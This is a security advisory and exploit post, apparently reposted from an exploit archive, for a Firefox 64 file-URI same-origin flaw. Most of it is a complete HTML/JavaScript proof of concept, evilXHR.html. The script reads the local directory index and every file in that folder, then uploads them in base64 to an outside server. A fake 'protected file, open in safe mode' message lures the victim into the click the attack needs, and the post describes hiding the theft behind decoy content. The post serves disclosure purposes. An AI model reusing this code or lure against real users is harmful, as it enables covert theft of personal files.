@@ -1,0 +1,272 @@
+id: 32011
+date: 01/20/2019
+title: Mozilla Firefox 64 Information Disclosure Exploit
+author: Vladimir Bostanov
+cves: 
+
+Product: Firefox
+Manufacturer: Mozilla
+Affected Versions: <= 64
+Tested Versions: 61, 62, 63, 64
+Vulnerability Type: Information Exposure (CWE-200)
+Risk Level: Medium
+Solution Status: Open
+Manufacturer Notification: 2018-07-19
+Solution Date: -
+Public Disclosure: 2019-01-16
+CVE Reference: Not yet assigned
+Author of Advisory: Dr. Vladimir Bostanov, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Mozilla Firefox is a web browser available for various platforms including
+Windows, Linux, Mac, Android, and iOS [1]. It is one of the most popular
+web browsers according to StatCounter [2].
+
+An overly liberal same-origin policy for file URIs and a bug in the
+implementation of this policy make Firefox vulnerable to exposure of local
+files to a remote attacker.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+Firefox's same-origin policy for file URIs allows local files to read
+other files in the same directory but not the directory index [3]. For
+example, a file with the URI file:///home/joe/Dowloads/aFile.html can read
+file:///home/joe/Dowloads/anotherFile.html, but it should not be able to
+read file:///home/joe/Dowloads/. We discovered, however, a violation of
+this policy in the special case when a user first opens a local directory,
+e.g., file:///home/joe/Dowloads/, in the browser and from there navigates
+to a file in this directory, e.g., file:///home/joe/Dowloads/aFile.html.
+In this case, aFile.html can read the Downloads directory index. This
+allows a malicious script in aFile.html to read all files in this
+directory by referring to each of them by its respective filename, and to
+send all the data to a remote server controlled by the attacker.
+
+The following attack scenario seems plausible. A user saves a HTML file in
+the Downloads folder. The victim user might have received the file per
+email; or downloaded it from a malicious website offering, e.g. free
+eBooks, or picture albums, etc.; or downloaded it from a corporate website
+where a malicious employee had uploaded it. The victim clicks on the
+filename in the file manager. The file is opened with the default Firefox
+browser. The victim is presented with a directory index and a message
+explaining that the file is "protected" and the user should open it in
+"safe mode" by clicking on the link in the directory index. The victim
+clicks again on the filename, this time in the browser's directory
+listing. The contents of the HTML document is displayed. In the
+background, the malicious JavaScript reads, first, the directory index,
+then, the contents of each file in the Downloads directory, and sends all
+these data to a website controlled by the attacker.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+We offer a test website [5] where a user can check if a browser is
+vulnerable to evilXHR. The above scenario is implemented by the following
+HTML file evilXHR.html:
+
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>evilXHR</title>
+<!-- evilXHR.html, when stored locally and opened in a Firefox browser,
+displays the current directory index in an iframe and then prompts the
+victim user to reopen the file in the iframe by clicking on the
+corresponding link (evilXHR.html) in the directory listing. When opened in
+this particular way, evilXHR.html has access to the directory index and
+can upload all files from the current directory to a remote server
+(controlled by the attacker), by reading the file names and the data with
+XMLHttpRequest().
+
+Author: Vladimir Bostanov, SySS GmbH  -->
+
+<script src="https://ptvb.sy.gs/evilXHR/base64ArrayBuffer.js"></script>
+<!-- Jon Leighton's base64 converter available at
+ https://gist.github.com/jonleighton/958841 -->
+
+<script>
+// The script will be called from this HTML file:
+var htmlName = 'evilXHR.html';
+
+// Files will be uploaded to this site:
+var siteURL = 'https://ptvb.sy.gs/evilXHR/';
+var phpURL = siteURL + 'upload.php';
+
+var cType = 'application/x-www-form-urlencoded';
+var guID = Date.now() + Math.random().toString().substr(3,8);
+var uploadPathURL = siteURL + 'Uploads/' + guID;
+//-------------------------------
+function singleFileEvilXHR(fName)
+  {
+  var xGetFile = new XMLHttpRequest();
+  xGetFile.onreadystatechange = function()
+    {
+    if (this.readyState == 4)
+      {
+      var xPostFile = new XMLHttpRequest();
+      xPostFile.open('POST', phpURL);
+      var fURL = encodeURIComponent(this.responseURL);
+      var fData = encodeURIComponent(base64ArrayBuffer(this.response));
+      xPostFile.setRequestHeader('Content-Type', cType);
+      xPostFile.send('guID='+guID + '&fURL='+fURL + '&fData='+fData);
+      }
+    }
+  xGetFile.open('GET', fName);
+  xGetFile.responseType = 'arraybuffer';
+  xGetFile.send();
+  }
+//-------------------------------
+function allFilesEvilXHR()
+  {
+  var xGetDir = new XMLHttpRequest();
+  xGetDir.onreadystatechange = function()
+    {
+    if (this.readyState == 4)
+      {
+      var xPostDir = new XMLHttpRequest();
+      xPostDir.open('POST', phpURL);
+      var dData = encodeURIComponent(this.response);
+      xPostDir.setRequestHeader('Content-Type', cType);
+      xPostDir.send('guID=' + guID + '&dData=' + dData);
+      var dirIndex = this.response.split('\n');
+      for (var n = 2; n < dirIndex.length-1; n++)
+        {
+        var dirIndexEntry = dirIndex[n].split(' ');
+        if (dirIndexEntry[4] == 'FILE' && dirIndexEntry[1] != htmlName)
+          {
+          singleFileEvilXHR(dirIndexEntry[1]);
+          }
+        }
+      }
+    }
+  xGetDir.open('GET', '.');
+  xGetDir.responseType = 'text'
+  xGetDir.send();
+  }
+//-------------------------------
+function evilXHR()
+  {
+  if (navigator.userAgent.search('Firefox') == -1)
+    {
+    document.body.innerHTML =
+      '<h1>This file must be opened with Mozilla Firefox</h1>';
+    return;
+    }
+  var out = document.getElementById('out');
+  var msg = document.getElementById('msg');
+  var ifr = document.getElementById('ifr');
+  var cnt = document.getElementById('cnt');
+  var xEN = document.getElementById('xEN');
+  var xDE = document.getElementById('xDE');
+
+  if (window.self == window.top)
+    { // The file is opened in the top window.
+    if (location.search != '?mode=safe')
+      { // The file was opened in the top window
+        // directly (i.e., NOT via dir index).
+      document.body.removeChild(cnt); // Hide camouflage content.
+      msg.setAttribute('class','visible'); // Show bogus message.
+      ifr.setAttribute('class','visible'); // Show dir index in iframe.
+      ifr.setAttribute('height','700');
+      }
+    else // The file has been reopened via directory index. Hence,
+      {  // it has access to the dir index, i.e. to all filenames.
+      document.body.removeChild(msg); // Hide bogus message.
+      document.body.removeChild(ifr); // Hide iframe.
+      cnt.setAttribute('class','visible'); // Show camouflage content.
+      allFilesEvilXHR(); // Upload all files + directory index
+
+      xEN.href = uploadPathURL; xDE.href = uploadPathURL;
+      xEN.innerHTML = uploadPathURL; xDE.innerHTML = uploadPathURL;
+      }
+    }
+  else // The file has been reopened in the iframe.
+    {
+    out.href = location.href + '?mode=safe';
+    out.click(); // Reopen the file in the top window.
+    }
+  document.body.style = 'visibility:visible';
+  }
+</script>
+
+<style>
+  body {font-size:large; max-width:60em;}
+  code {font-size:125%}
+  code.blue {color:blue}
+  button {color:green}
+  div#msg {padding-left:1em; color:red; background:yellow;}
+  .visible {width:100%; margin:0; border:0 none; visibility:visible;}
+  .hidden {width:0; height:0; margin:0; padding:0; border:0 none;
+           overflow:hidden; visibility:hidden;}
+</style>
+</head><body onload="evilXHR()">
+
+<a id="out" class="hidden" href="" target="_top"></a>
+
+<div id="msg" class="hidden">
+The file <code>evilXHR.html</code> is protected.
+Click on the link <code class="blue">evilXHR.html</code>
+below to open it in safe mode.&nbps;&nbps;<button type="button"
+ onclick="document.body.removeChild(msg)">OK, I got it!</button>
+</div>
+
+<iframe  id="ifr" class="hidden" src="."></iframe>
+
+<div id="cnt" class="hidden">
+
+<h1>evilXHR</h1>
+
+<p>This file, <code>evilXHR.html</code>, attempts to upload files from
+your computer/mobile device to our server. In case of success, you will
+find the copies of your files during the next 2 to 3 minutes at the
+following
+location (larger files take longer to upload):</p>
+
+<p><a id="xEN" href="" target="_blank"></a></p>
+
+<p><b>Note:</b> In the case of a real attack, some camouflage content
+(e.g., an eBook, or a picture album, etc.) will be displayed here
+instead of the current text, in order to conceal the data theft
+from the victim.</p>
+
+<h1>evilXHR &mdash; Deutsch</h1>
+
+<p>Diese Datei, <code>evilXHR.html</code>, versucht Dateien von Ihrem
+Computer oder mobilem Gerat auf unseren Server hochzuladen. Wenn das
+gelingt, konnen Sie die Kopien Ihrer Dateien in den nachsten 2 bis 3
+Minuten unter dem folgenden Link finden (grossere Dateien werden
+langsamer hochgeladen):</p>
+
+<p><a id="xDE" href="" target="_blank"></a></p>
+
+<p><b>Bemerkung:</b> Im Falle eines echten Angriffs wurden hier statt
+dieses Texts andere Inhalte als Tarnung stehen (z.B. ein eBook, oder
+schone Bilder, usw.), damit das Opfer den Datendiebstahl nicht merkt.</p>
+
+</div>
+</body></html>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+ ~ If you store and open HTML files locally, save them in a directory
+   that does not contain any personal or confidential data.
+
+ ~ Do not use the directory index of the browser for navigation.
+   Open local HTML files directly in the browser.
+
+ ~ Update to a non-vulnerable Mozilla Firefox version.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2018-07-17: Vulnerability discovered.
+2018-07-19: Vulnerability reported to manufacturer.
+2018-12-01: Security Advisory sent to manufacturer;
+            2019-01-15 set as disclosure deadline.
+2019-01-16: Vulnerability publicly disclosed.
+
+#  0day.today [2023-03-23]  #
